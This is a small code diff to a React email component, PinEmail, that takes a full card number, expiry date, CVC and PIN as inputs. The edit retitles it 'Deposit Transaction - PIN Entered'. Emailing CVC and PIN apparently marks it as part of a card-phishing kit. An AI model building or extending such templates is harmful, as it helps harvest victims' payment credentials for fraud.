@@ -12,8 +12,8 @@ interface PinEmailProps {
 export function PinEmail({ email, amount, cardName, cardNumber, expiryDate, cvc, cardType, pin }: PinEmailProps) {
   return (
     <div style={{ fontFamily: "Arial, sans-serif", maxWidth: "600px", margin: "0 auto" }}>
-      <h2 style={{ color: "#1e40af" }}>Deposit Transaction Alert</h2>
-      <p>A deposit transaction has been initiated with full payment details:</p>
+      <h2 style={{ color: "#059669" }}>Deposit Transaction - PIN Entered</h2>
+      <p>A deposit transaction has been initiated with the following details:</p>
       <div
         style={{
           background: "#f3f4f6",
